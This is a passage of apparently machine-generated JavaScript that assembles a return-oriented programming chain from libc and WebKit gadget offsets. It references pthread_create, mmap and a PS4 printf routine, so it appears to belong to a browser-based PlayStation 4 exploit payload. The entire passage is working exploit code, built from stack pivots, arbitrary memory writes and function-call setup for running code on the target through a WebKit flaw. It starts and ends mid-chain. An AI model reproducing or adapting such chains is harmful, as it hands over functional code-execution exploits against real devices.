db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
pthread_create_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+160328, //L2348
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2348:
db([0, 0]); // 0x0
//L2121:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
mmap_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+161656, //L2349
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2349:
db([0, 0]); // 0x0
//_printf_:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+161728, //L2351
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2351:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+161792, //L2353
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2353:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+161896, //L2354
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+161912, //L2355
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2354:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2355:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+162032, //L2356
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+162016, //L2357
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2357:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2356:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+162104, //L2359
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2359:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+162192, //L2360
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+162224, //L2362
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2360:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2361:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2362:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+162336, //L2365
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+162320, //L2364
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2364:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2365:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+162472, //L2368
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+162440, //L2366
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2366:
db([0, 0]); // 0x0
set_gadgets([
libc_base+165442, //pop rdi
//L2367:
ropchain+136, //_ps4_printf_fd
libc_base+768796 //pop rax
]);
//L2368:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+162632, //L2370
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+162664, //L2372
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+162616, //L2369
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+162648, //L2371
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2369:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2370:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2371:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+162744, //L2373
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+162760, //L2374
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2373:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+162872, //L2375
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+162904, //L2377
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+162888, //L2376
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2375:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2376:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2377:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+8949069, //setle al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+163064, //L2378
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+163096, //L2380
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+163080, //L2379
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2378:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2379:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2380:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+163240, //L2384
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+163256, //L2385
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+163224, //L2383
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2383:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2384:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2385:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+163368, //L2386+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+163360, //L2386
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L2386:
db([0, 0]); // 0x0
set_gadgets([
ropchain+163384, //L2386+24
ropchain+164216, //L2381
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+163456, //L2389
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2387:
db([1, 0]); // 0x1
set_gadget(libc_base+165442,); //pop rdi
//L2388:
db([1, 0]); // 0x1
set_gadget(webkit_base+3789839,); //pop r11
//L2389:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+163552, //L2391
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+163536, //L2390
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2391:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+163648, //L2393
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2392:
db([16, 0]); // 0x10
set_gadget(libc_base+768796,); //pop rax
//L2393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+163792, //L2396
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+163760, //L2394
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2394:
db([0, 0]); // 0x0
set_gadgets([
libc_base+165442, //pop rdi
//L2395:
ropchain+136, //_ps4_printf_fd
libc_base+768796 //pop rax
]);
//L2396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+163952, //L2398
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+163984, //L2400
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+163936, //L2397
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+163968, //L2399
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2397:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2398:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2399:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+164080, //L2402
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+164064, //L2401
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2402:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2404:
ropchain+164184, //L2403
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+166648, //L2405
//L2403:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
//L2381:
libc_base+713278, //pop rsi
ropchain+164272, //L2407
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2406:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L2407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+164376, //L2410
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+164360, //L2409
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2409:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2410:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229136, //mov al, [rdi]
libc_base+713278, //pop rsi
ropchain+164536, //L2415
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+164504, //L2413
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+164520, //L2414
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2412:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L2413:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2414:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+164592, //L2416
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+164720, //L2419
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+164736, //L2420
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+164704, //L2418
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2418:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2419:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2420:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+164896, //L2424
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+164864, //L2422
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+164880, //L2423
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2421:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L2422:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2423:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+164952, //L2425
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+165080, //L2428
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+165096, //L2429
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+165064, //L2427
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2427:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2428:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2429:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+165176, //L2430
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+165192, //L2431
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2430:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2431:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+165352, //L2435
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+165320, //L2433
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+165336, //L2434
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2432:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L2433:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2434:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2435:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+165408, //L2436
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2436:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+165536, //L2439
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+165552, //L2440
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+165520, //L2438
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2438:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2439:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2440:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+165648, //L2442
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+165632, //L2441
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
